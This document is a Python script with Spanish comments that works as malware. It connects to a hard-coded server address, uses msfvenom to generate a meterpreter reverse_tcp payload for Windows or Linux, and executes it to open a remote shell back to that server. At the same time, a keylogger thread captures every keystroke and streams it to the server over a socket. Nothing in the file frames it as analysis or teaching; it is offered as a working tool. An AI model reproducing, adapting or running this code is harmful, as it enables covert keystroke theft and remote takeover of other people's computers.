import os
import socket
import sys
import platform
import subprocess
import threading
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Intentar importar pynput para entornos gráficos
try:
    from pynput import keyboard as pynput_keyboard
    use_pynput = True
except ImportError:
    use_pynput = False

# Importar keyboard para entornos no gráficos
if not use_pynput:
    import keyboard as kb

# Dirección IP y puerto del servidor
SERVER_IP = '192.168.5.145'  # Reemplaza con la IP del servidor
PORT = 7777
REVERSE_PORT = 7755  # Puerto para la shell reversa

# Crear un socket para conectarse al servidor
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))

print(Fore.GREEN + Style.BRIGHT + f"\n{'='*60}")
print(Fore.GREEN + Style.BRIGHT + f"🟢 Conectado al servidor en {SERVER_IP}:{PORT}")
print(Fore.GREEN + Style.BRIGHT + f"{'='*60}\n")

# Función para generar la payload de la reverse shell
def generate_reverse_shell():
    os_name = platform.system().lower()
    shell_file = ""

    if os_name == "windows":
        shell_file = "shell.exe"
        command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={SERVER_IP} LPORT={REVERSE_PORT} -f exe > {shell_file}"
    elif os_name == "linux":
        shell_file = "shell.elf"
        command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={SERVER_IP} LPORT={REVERSE_PORT} -f elf > {shell_file}"
    else:
        print(Fore.RED + Style.BRIGHT + "❌ Sistema operativo no soportado para la reverse shell.")
        return None

    print(Fore.CYAN + Style.BRIGHT + f"⚙️ Generando la reverse shell para {os_name}...")
    subprocess.run(command, shell=True)
    return shell_file

# Función para ejecutar la reverse shell
def execute_reverse_shell(shell_file):
    if shell_file:
        try:
            print(Fore.CYAN + Style.BRIGHT + f"🚀 Ejecutando la reverse shell {shell_file}...")
            if platform.system().lower() == "windows":
                os.startfile(shell_file)
            else:
                subprocess.run(f"chmod +x {shell_file} && ./{shell_file}", shell=True)
        except Exception as e:
            print(Fore.RED + Style.BRIGHT + f"❌ Error ejecutando la reverse shell: {e}")

# Función para capturar teclas
def capture_keystrokes():
    # Configurar variables para el diseño
    data_buffer = []

    # Función para enviar las teclas al servidor
    def send_to_server(key):
        data_buffer.append(key)
        if len(data_buffer) > 20:
            data_buffer.pop(0)
        message = ' | '.join(data_buffer)
        client_socket.sendall(message.encode('utf-8'))

    # Manejador de eventos para pynput
    def on_pynput_key_press(key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        send_to_server(key_str)

    # Configurar el listener para el teclado en entornos gráficos
    if use_pynput:
        print(Fore.CYAN + Style.BRIGHT + "🔄 Usando pynput para captura de teclas en entorno gráfico.")
        listener = pynput_keyboard.Listener(on_press=on_pynput_key_press)
        listener.start()
        listener.join()
    else:
        # Configurar el listener para el teclado en entornos no gráficos
        print(Fore.CYAN + Style.BRIGHT + "🔄 Usando keyboard para captura de teclas en terminal.")
        def on_kb_event(event):
            send_to_server(event.name)
        
        kb.on_press(on_kb_event)
        kb.wait()  # Mantener el script en ejecución en entorno de terminal

# Ejecutar la shell y captura de teclas en paralelo
if __name__ == "__main__":
    # Generar y ejecutar la reverse shell
    shell_file = generate_reverse_shell()

    # Iniciar el hilo de captura de teclas
    keystroke_thread = threading.Thread(target=capture_keystrokes)
    keystroke_thread.start()

    # Ejecutar la reverse shell en el hilo principal
    if shell_file:
        execute_reverse_shell(shell_file)

    # Esperar que el hilo de captura de teclas termine
    keystroke_thread.join()

    # Cerrar la conexión después de terminar
    client_socket.close()
    print(Fore.MAGENTA + Style.BRIGHT + "\n🔒 Conexión cerrada.\n")
